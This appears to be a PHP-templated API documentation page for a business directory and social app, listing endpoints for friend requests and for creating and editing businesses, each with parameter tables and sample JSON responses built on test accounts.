<div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">data</span>: <div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">friends</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">request_id</span>: <span class="type-string">"3"</span>,</div></li><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"4"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miral"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"miralviroja1@gmail.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"69.24439142729223"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">request_id</span>: <span class="type-string">"5"</span>,</div></li><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"7"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Test"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"test@vros.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"132.22478539486022"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">request_id</span>: <span class="type-string">"4"</span>,</div></li><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"8"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miral"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"miralviroja2@gmail.com"</span>,</div></li><li><div class="hoverable hovered"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"220.16422967783186"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">request_id</span>: <span class="type-string">"8"</span>,</div></li><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"47"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"renish"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"patel"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"renish@vros5.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">request_id</span>: <span class="type-string">"6"</span>,</div></li><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"21"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Jason Vrane"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"4vrane@gmail.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">friends_request</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">request_id</span>: <span class="type-string">"7"</span>,</div></li><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"45"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"renish"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"patel"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"renish@vros3.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/user/41/e445adb8b159556ecf4bddaa382e0e85.png" class="hoverZoomLink">http://localhost:8888/test/businessApp/user/41/e445adb8b159556ecf4bddaa382e0e85.png</a><span class="type-string">"</span></div></li></ul>}</div></li></ul>]</div></li></ul>}</div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>

<?php
include 'search_friends.php';
?>


<div class="section" id="RequestAction">
    <h2>Accept/Reject/Removed Friends
        <a class="headerlink" href="index.php#RequestAction" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'friendsRequestAction.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Accept/Reject/Remove friend </p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'friends/friendRequest_action';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>request_id</td>
                <td>Required</td>
                <td></td>
            </tr>
              <tr class="row-even">
                <td>is_request_action</td>
                <td>Required</td>
                <td>(1=Accept, 2=reject or Removed friend)</td>
            </tr>
            
        </tbody>
    </table>
</div>
   
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
<div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Accepted."</span></div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>

<div class="section" id="createBusiness">
    <h2>Create Business
        <a class="headerlink" href="index.php#createBusiness" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'createBusiness.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Create Business </p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'business/create_business';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>name</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>description</td>
                <td>Required</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>cityID</td>
                <td>required</td>
                <td></td>
            </tr>
           
            
            <tr class="row-even">
                <td>email</td>
                <td>Required</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>deLatitude</td>
                <td>Required</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>deLongitude</td>
                <td>Required</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>address</td>
                <td>Required</td>
                <td></td>
            </tr>           
            <tr class="row-even">
                <td>location</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>category_id</td>
                <td>Required</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>mobile</td>
                <td>optional</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>working_hours</td>
                <td>optional</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>since</td>
                <td>optional</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>website</td>
                <td>optional</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>fb_link</td>
                <td>optional</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>twitter_link</td>
                <td>optional</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>gplus_link</td>
                <td>optional</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>cover_image</td>
                <td>Required</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td></td>
                <td></td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>image1</td>
                <td>Required</td>
                <td> next images will be optional 
                    <br> it should be image2,image3 so on..</td>
            </tr>
            <tr class="row-even">
                <td>is_iCount</td>
                <td>Required</td>
                <td>Total selected images count</td>
            </tr>

            <tr class="row-even">
                <td></td>
                <td></td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>video1</td>
                <td>optional</td>
                <td>Next videos should be video2,video3 and so on..
                    <br> all videos are optional..</td>
            </tr>
            <tr class="row-even">
                <td>thumb1</td>
                <td>optional</td>
                <td>Next videos thumb  should be thumb2,thumb3 and so on..
                    <br> thumb us eqal to videos..</td>
            </tr>

            <tr class="row-even">
                <td>is_vCount</td>
                <td>Required</td>
                <td>Total selected video count</td>
            </tr>
            
            
            
        </tbody>
        </table>
        
</div>
   
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
<div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Created successfully!"</span></div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>

<div class="section" id="editBusiness">
    <h2>Edit Business
        <a class="headerlink" href="index.php#editBusiness" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'editBusiness.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Edit Business </p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'business/create_business';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>business_id</td>
                <td>required</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>name</td>
                <td>optional</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>description</td>
                <td>optional</td>
                <td></td>
            </tr>             
           
            
            <tr class="row-even">
                <td>email</td>
                <td>optional</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>deLatitude</td>
                <td>optional</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>deLongitude</td>
                <td>optional</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>address</td>
                <td>optional</td>
                <td></td>
            </tr>           
            <tr class="row-even">
                <td>location</td>
                <td>optional</td>
                <td></td>
            </tr>
           
            <tr class="row-even">
                <td>category_id</td>
                <td>optional</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>mobile</td>
                <td>optional</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>working_hours</td>
                <td>optional</td>
                <td></td>
            </tr>
                <tr class="row-even">
                <td>cover_image</td>
                <td>optional</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>since</td>
                <td>optional</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td></td>
                <td></td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>image1</td>
                <td>Required</td>
                <td> next images will be optional 
                    <br> it should be image2,image3 so on..</td>
            </tr>
            <tr class="row-even">
                <td>is_images_deleted_ids</td>
                <td>optional</td>
                <td> its comma seperated images ids if
                    <br> user will delete any image.Please read below note</td>
            </tr>
          
            <tr class="row-even">
                <td>is_iCount</td>
                <td>Required</td>
                <td>Total selected images count</td>
            </tr>
            <tr class="row-even">
                <td></td>
                <td></td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>video1</td>
                <td>optional</td>
                <td>Next videos should be video2,video3 and so on..
                    <br> all videos are optional..</td>
            </tr>
             <tr class="row-even">
                <td>thumb1</td>
                <td>optional</td>
                <td>Next videos thumb  should be thumb2,thumb3 and so on..
                    <br> thumb us eqal to videos..</td>
            </tr>
            <tr class="row-even">
                <td>is_video_deleted_ids</td>
                <td>optional</td>
                <td> its comma seperated videos ids if
                    <br> user will delete any video.Please read below note</td>
            </tr>
         
            <tr class="row-even">
                <td>is_vCount</td>
                <td>Required</td>
                <td>Total selected video count</td>
            </tr>
            
           
            
            
            
        </tbody>
        </table>
        
</div>
  <div>
      <lable>Notes:- </lable>
      <p>suppose business have five images ,which have image_id :- 1,2,3,4,5 <br>
         user will delete 2 and 3 image ,edit 4 th image and add two new image..<br>
          so now in this case..<br>
          is_images_deleted_ids=2,3   (because user have deleted this images)<br>
      </p>

  </div>
   
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
<div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Edited successfully!"</span></div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>
<?php include 'delete_business.php';
      include 'delete_comment.php';
      include 'notification_master.php';  
      include 'get_notification_data.php';
      include 'update_notification_count.php';
 include 'update_all_notification_count.php';
include 'add_business_revenue_count.php';
      include 'test_noti.php';
      include 'QRGraph.php';
     include 'ImpressionGraph.php';
      include 'ClickGraph.php';
?>
<!--
<div class="section" id="editBusinessmedias">
    <h2>Edit Business medias
        <a class="headerlink" href="index.php#editBusinessmedias" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'editBusinessmedias.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Edit Business Medias </p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'business/edit_business_medias';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>business_id</td>
                <td>required</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>image</td>
                <td>required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>row_id</td>
                <td>required</td>
                <td>image_id or video_id</td>
            </tr>     
             <tr class="row-even">
                <td>is_default</td>
                <td>required</td>
                <td>1=cover image and 0 = other images</td>
            </tr>     
            <tr class="row-even">
                <td>type</td>
                <td>required</td>
                <td>i=cover images and v = videos</td>
            </tr>     
           
            
            
            
            
        </tbody>
        </table>
        
</div>
   
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
<div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Edited successfully!"</span></div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>
-->




</div>
                    
<footer><hr> <div class="rst-footer-buttons right" role="navigation" aria-label="footer navigation">
    <a target="_blank" href="http://www.amcodr.co">Amcodr</a>
</div>
</footer></div>                                                                                                                                                                                              </section>                                                                                                                                                                                         </div>                                                                                                                                                                                            <script type="text/javascript">
var DOCUMENTATION_OPTIONS = {
    URL_ROOT:'./',
    VERSION:'1.5.0',
    COLLAPSE_INDEX:false,
    FILE_SUFFIX:'.html',
    HAS_SOURCE:  true
};
</script>                                                                                                                                                                                            <script type="text/javascript" src="includes/jquery-2.0.3.min.js"></script>
<script type="text/javascript">
  jQuery(function () {
     $('.toctree-l1').click(function(){
        $('.current').removeClass('current');
        $(this).addClass('current');
    });
 });
</script>                                                                                                                                                        </body>
</html>